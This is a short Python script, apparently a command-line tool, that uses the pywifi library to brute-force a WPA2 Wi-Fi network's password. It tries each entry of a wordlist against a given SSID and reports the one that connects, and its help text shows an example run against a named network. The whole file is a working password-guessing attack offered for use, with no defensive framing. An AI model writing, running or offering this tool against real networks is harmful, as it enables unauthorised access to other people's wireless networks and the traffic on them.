import time
import argparse
from pywifi import PyWiFi, const, Profile

def connect_to_wifi(ssid, password_file):
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(1)

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        iface.remove_all_network_profiles()

        with open(password_file, 'r') as f:
            for password in f:
                password = password.strip()  
                print(f"Testing password: {password}")
                profile.key = password
                tmp_profile = iface.add_network_profile(profile)
                iface.connect(tmp_profile)
                time.sleep(5)

                if iface.status() == const.IFACE_CONNECTED:
                    print(f"Connecting to the network {ssid} with the password {password}")
                    return True
                else:
                    print(f"The password {password} is not valid")
                    iface.disconnect()

        print("None of the passwords provided are valid")
        return False
    else:
        print("You are already connected to a network")
        return True

def show_help():
    help_text = """
    Usage: connection.py -s <SSID> -l <password_file>
    
    Options:
    -s, --ssid       Specify the SSID of the Wi-Fi network to connect to.
    -l, --list       Specify the path to a text file containing passwords.
    -h, --help       Show this help message and exit.
    
    Example:
    python connection.py -s CLARO1167 -l passwords.txt
    """
    print(help_text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Connect to a Wi-Fi network using a list of passwords.')
    parser.add_argument('-s', '--ssid', type=str, help='SSID of the Wi-Fi network')
    parser.add_argument('-l', '--list', type=str, help='Path to the password file')

    args = parser.parse_args()

    if args.ssid and args.list:
        ssid = args.ssid
        password_file = args.list
        if connect_to_wifi(ssid, password_file):
            print("Connection successful !")
        else:
            print("Could not connect")
    else:
        show_help()  